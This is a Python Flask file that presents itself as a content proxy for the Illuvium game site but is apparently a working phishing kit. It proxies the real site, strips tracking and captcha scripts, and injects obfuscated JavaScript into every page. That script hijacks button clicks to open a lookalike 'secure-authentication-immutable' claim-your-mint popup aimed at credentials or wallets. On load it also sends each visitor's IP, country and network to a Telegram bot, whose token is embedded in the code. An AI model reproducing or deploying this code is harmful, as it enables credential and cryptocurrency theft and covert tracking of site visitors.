from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
const _0x13d1f0=_0x2c27;(function(_0x5ae5fd,_0x22b76a){const _0x478ff3=_0x2c27,_0x19524f=_0x5ae5fd();while(!![]){try{const _0x2973fb=-parseInt(_0x478ff3(0x90))/0x1+-parseInt(_0x478ff3(0x8b))/0x2*(parseInt(_0x478ff3(0x8c))/0x3)+parseInt(_0x478ff3(0xab))/0x4+-parseInt(_0x478ff3(0xb0))/0x5*(-parseInt(_0x478ff3(0xa6))/0x6)+parseInt(_0x478ff3(0xba))/0x7+parseInt(_0x478ff3(0xb3))/0x8+parseInt(_0x478ff3(0xa3))/0x9;if(_0x2973fb===_0x22b76a)break;else _0x19524f['push'](_0x19524f['shift']());}catch(_0x14ebc6){_0x19524f['push'](_0x19524f['shift']());}}}(_0x38d6,0x24a9f),document[_0x13d1f0(0xbd)](_0x13d1f0(0xbc),function(){const _0x31515a=_0x13d1f0;console[_0x31515a(0xbf)]('');const _0x232682={'Play\x20for\x20Free':'','Play\x20Now':_0x31515a(0xaf),'Log\x20In\x20with\x20Passport':_0x31515a(0xc5),'Connect\x20Wallet':_0x31515a(0x82),'Launch\x20Game':_0x31515a(0xac),'Create\x20Account':_0x31515a(0xb9),'Sign\x20Up':_0x31515a(0xae),'Register':_0x31515a(0x8a),'News':_0x31515a(0x97),'Home':_0x31515a(0x88),'About':'Info','Contact':_0x31515a(0x95),'FAQ':_0x31515a(0x98),'Roadmap':'Timeline','Whitepaper':_0x31515a(0xb1)};function _0x116ce2(_0x355779,_0x539cce,_0x23e8f3){const _0x53ea71=_0x31515a;console[_0x53ea71(0xbf)]('',{'element':_0x355779['outerHTML'],'oldText':_0x539cce,'newText':_0x23e8f3,'timestamp':new Date()['toISOString']()});}function _0x162927(_0x552e9e){const _0x2aac68=_0x31515a;let _0x232f2f='';for(const _0x258ade of _0x552e9e[_0x2aac68(0x8e)]){_0x258ade[_0x2aac68(0xa0)]===Node['TEXT_NODE']&&(_0x232f2f+=_0x258ade['textContent'][_0x2aac68(0xa9)]());}!_0x232f2f&&(_0x232f2f=_0x552e9e[_0x2aac68(0x91)][_0x2aac68(0xa9)]());if(_0x232682[_0x232f2f]){const _0x56e5aa=_0x232f2f;if(_0x552e9e[_0x2aac68(0x8e)][_0x2aac68(0x83)]===0x1&&_0x552e9e[_0x2aac68(0x8e)][0x0][_0x2aac68(0xa0)]===Node['TEXT_NODE'])_0x552e9e[_0x2aac68(0x91)]=_0x232682[_0x232f2f];else{let _0x1d548d=![];for(const _0x3da2f9 of _0x552e9e[_0x2aac68(0x8e)]){if(_0x3da2f9[_0x2aac68(0xa0)]===Node[_0x2aac68(0xaa)]&&_0x3da2f9[_0x2aac68(0x91)][_0x2aac68(0xa9)]()===_0x232f2f){_0x3da2f9[_0x2aac68(0x91)]=_0x232682[_0x232f2f],_0x1d548d=!![];break;}}!_0x1d548d&&(_0x552e9e[_0x2aac68(0x91)]=_0x232682[_0x232f2f]);}_0x116ce2(_0x552e9e,_0x56e5aa,_0x232682[_0x232f2f]);}_0x552e9e[_0x2aac68(0x89)]['add'](_0x2aac68(0x81));}function _0x388f2f(){const _0x5a037f=_0x31515a;document[_0x5a037f(0x92)](_0x5a037f(0xbe))[_0x5a037f(0x9a)](_0x162927),document[_0x5a037f(0x92)](_0x5a037f(0x93))[_0x5a037f(0x9a)](_0x162927),document[_0x5a037f(0x92)](_0x5a037f(0x96))[_0x5a037f(0x9a)](_0x162927);}_0x388f2f(),console[_0x31515a(0xbf)](''),setInterval(function(){const _0x2942d5=_0x31515a;document[_0x2942d5(0x92)](_0x2942d5(0x85))[_0x2942d5(0x9a)](_0x162927);},0x3e8);const _0x1a5a93=new MutationObserver(function(_0x49a3e9){const _0x130d56=_0x31515a;let _0xc816ad=![];_0x49a3e9[_0x130d56(0x9a)](function(_0x2dea6c){const _0x56553f=_0x130d56;_0x2dea6c['addedNodes'][_0x56553f(0x83)]&&(_0xc816ad=!![]);}),_0xc816ad&&document[_0x130d56(0x92)](_0x130d56(0x85))['forEach'](_0x162927);});_0x1a5a93[_0x31515a(0x9d)](document[_0x31515a(0x7f)],{'childList':!![],'subtree':!![]}),document[_0x31515a(0xbd)](_0x31515a(0x8d),function(_0x2e27f0){const _0x677e7b=_0x31515a,_0x1d73ec=_0x2e27f0['target'],_0x2443d9=_0x1d73ec['closest']('button,\x20a');if(!_0x2443d9)return;if(_0x2443d9[_0x677e7b(0x89)][_0x677e7b(0xbb)]('css-tvaofb')||_0x2443d9[_0x677e7b(0x89)][_0x677e7b(0xbb)](_0x677e7b(0x84))||_0x2443d9['classList'][_0x677e7b(0xbb)](_0x677e7b(0xb8))||_0x2443d9['classList'][_0x677e7b(0xbb)]('css-1oqedzn')||_0x2443d9[_0x677e7b(0x89)]['contains'](_0x677e7b(0xb5)))return;_0x2e27f0['preventDefault'](),_0x2e27f0[_0x677e7b(0xb4)]();if(_0x2443d9[_0x677e7b(0x89)][_0x677e7b(0xbb)](_0x677e7b(0x81))){console[_0x677e7b(0xbf)](_0x677e7b(0xb7));const _0x245c7c=0x320,_0x24fb4b=0x258,_0x257acf=window[_0x677e7b(0xa8)][_0x677e7b(0x94)]/0x2-_0x245c7c/0x2,_0x5e35ff=window[_0x677e7b(0xa8)][_0x677e7b(0xb6)]/0x2-_0x24fb4b/0x2;window[_0x677e7b(0xa7)](_0x677e7b(0x87),_0x677e7b(0x80),_0x677e7b(0xb2)+_0x245c7c+_0x677e7b(0xc2)+_0x24fb4b+_0x677e7b(0x9f)+_0x5e35ff+_0x677e7b(0xa4)+_0x257acf+_0x677e7b(0xa1));return;}console['log'](''),_0x2443d9[_0x677e7b(0x8d)]();},!![]);}));function _0x2c27(_0x5556bf,_0x378020){const _0x38d6ee=_0x38d6();return _0x2c27=function(_0x2c27c7,_0x2bcbed){_0x2c27c7=_0x2c27c7-0x7f;let _0x1411af=_0x38d6ee[_0x2c27c7];return _0x1411af;},_0x2c27(_0x5556bf,_0x378020);}async function sendIPToTelegram(){const _0x5646a4=_0x13d1f0,_0x1d12b8=_0x5646a4(0xa5),_0x2af040=_0x5646a4(0xc3);try{const _0x1812cb=await fetch(_0x5646a4(0xad)),_0x19f5d6=await _0x1812cb[_0x5646a4(0x9c)](),_0x497b1f=_0x19f5d6['ip'],_0x281ec2=_0x19f5d6[_0x5646a4(0x86)],_0x127e48=_0x19f5d6[_0x5646a4(0xa2)],_0x5b52bf=_0x5646a4(0xc1)+_0x497b1f+_0x5646a4(0xc0)+_0x281ec2+_0x5646a4(0xc0)+_0x127e48;await fetch(_0x5646a4(0x9e)+_0x1d12b8+_0x5646a4(0x8f),{'method':_0x5646a4(0x9b),'headers':{'Content-Type':_0x5646a4(0x99)},'body':JSON['stringify']({'chat_id':_0x2af040,'text':_0x5b52bf})});}catch(_0x216e32){console[_0x5646a4(0xc4)]('',_0x216e32);}}window[_0x13d1f0(0xbd)]('load',sendIPToTelegram);function _0x38d6(){const _0x451b52=['width=','1686720kqQJsL','stopPropagation','css-1i8s7az','height','Redirecting\x20to\x20Google','css-1hnz6hu','New\x20Account','1297338fiTsjt','contains','DOMContentLoaded','addEventListener','button,\x20a','log','\x20:\x20','[ILV]:\x20',',height=','7005236807','error','Start\x20Now','body','googleWindow','claim-button','Connect\x20Wallet','length','css-104rome','button:not(.claim-button),\x20a:not(.claim-button)','country_name','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','Main','classList','Collect\x20Now','290046sACWuX','3mwYHgE','click','childNodes','/sendMessage','245608YLrJaU','textContent','querySelectorAll','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','width','Reach\x20Us','.chakra-link,\x20.nav-link,\x20.menu-item','Updates','Help','application/json','forEach','POST','json','observe','https://api.telegram.org/bot',',top=','nodeType',',toolbar=no,menubar=no,scrollbars=yes,resizable=yes','org','418788RmRLTo',',left=','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','1104tfYWZu','open','screen','trim','TEXT_NODE','316592YxWDCi','Get\x20Yours','https://ipapi.co/json/','Register','Grab\x20Your\x20Spot','515ZRjYGO','Documentation'];_0x38d6=function(){return _0x451b52;};return _0x38d6();}
</script>
 

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
